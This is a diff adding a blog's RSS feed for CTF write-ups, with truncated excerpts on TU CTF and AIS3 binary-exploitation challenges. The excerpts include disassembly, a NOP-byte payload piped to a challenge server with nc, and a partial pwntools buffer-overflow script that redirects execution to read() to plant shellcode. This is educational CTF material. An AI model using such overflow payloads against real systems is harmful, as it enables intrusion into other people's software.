@@ -1,0 +1,39 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/">
+  <channel>
+    <title>writeup on Zet’s playground</title>
+    <link>https://blog.zet.tw/categories/writeup/</link>
+    <description>Recent content in writeup on Zet’s playground</description>
+    <image>
+      <url>https://blog.zet.tw/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E</url>
+      <link>https://blog.zet.tw/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E</link>
+    </image>
+    <generator>Hugo -- gohugo.io</generator>
+    <lastBuildDate>Sat, 21 May 2016 00:00:00 +0800</lastBuildDate><atom:link href="https://blog.zet.tw/categories/writeup/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>TU CTF - Where Heretics Suffer</title>
+      <link>https://blog.zet.tw/posts/2016-05-21-tu-ctf-where-heretics-suffer/</link>
+      <pubDate>Sat, 21 May 2016 00:00:00 +0800</pubDate>
+      
+      <guid>https://blog.zet.tw/posts/2016-05-21-tu-ctf-where-heretics-suffer/</guid>
+      <description>拿到這題的時候已經是一隻binary了，這是用比較新的gcc編的，對於function call 有一些新的機制，如下：
+80485cb: 8d 4c 24 04 lea ecx,[esp+0x4] 80485cf: 83 e4 f0 and esp,0xfffffff0 80485d2: ff 71 fc push DWORD PTR [ecx-0x4] 80485d5: 55 push ebp 80485d6: 89 e5 mov ebp,esp 80485d8: 51 push ecx 80485d9: 83 ec 34 sub esp,0x34 ...... 8048682: b8 00 00 00 00 mov eax,0x0 8048687: 8b 4d fc mov ecx,DWORD PTR [ebp-0x4] 804868a: c9 leave 804868b: 8d 61 fc lea esp,[ecx-0x4] 804868e: c3 ret 可以看到在初始化的時候lea ecx,[esp+0x4]，會把esp得值放到ecx中 之後再把ecx放到stack上，當我們overflow以後會把原本得直也蓋掉</description>
+    </item>
+    
+    <item>
+      <title>AIS3 pwn</title>
+      <link>https://blog.zet.tw/posts/2015-11-24-ais3-pwn/</link>
+      <pubDate>Tue, 24 Nov 2015 00:00:00 +0800</pubDate>
+      
+      <guid>https://blog.zet.tw/posts/2015-11-24-ais3-pwn/</guid>
+      <description>簡單紀錄一下
+PWN1 丟進ida 可以看到
+if ( v4 == 0x90909090 ) result = puts(aCensordCensord); else result = printf(&amp;#34;Your point is only %d, try hard!\n&amp;#34;, v4, v1, v2, v3); return result; 直接塞90結束
+python -c &amp;#39;print &amp;#34;\x90&amp;#34;*1000&amp;#39; | nc 52.69.163.194 1111 PWN2 定位到地20個字以後可以控制eip
+gdb-peda$ info functions All defined functions: Non-debugging symbols: 0x08048364 _init 0x080483a0 read@plt 可以指到read上,一般來說長這樣
+call ret argv1 ￼argv2 argv3 可以控制read的返回地址跟參數,所以可以把ret跟我們shellcode 指到同一個位置上,shellcode的話隨便找一段空⽩白的地⽅方寫上去就好
+from pwn import * import time r = remote(&amp;#39;127.0.0.1&amp;#39;, 4000) read_adr = &amp;#34;\xa0\x83\x04\x08&amp;#34; read = &amp;#34;\x00\x00\x00\x00&amp;#34; + &amp;#34;\x00\xa1\x04\x08&amp;#34; + &amp;#34;\x00\x01\x00\x00&amp;#34; p = &amp;#34;a&amp;#34;*20 + read_adr + &amp;#34;\x00\xa1\x04\x08&amp;#34; + read r.</description>
+    </item>
+    
+  </channel>
+</rss>
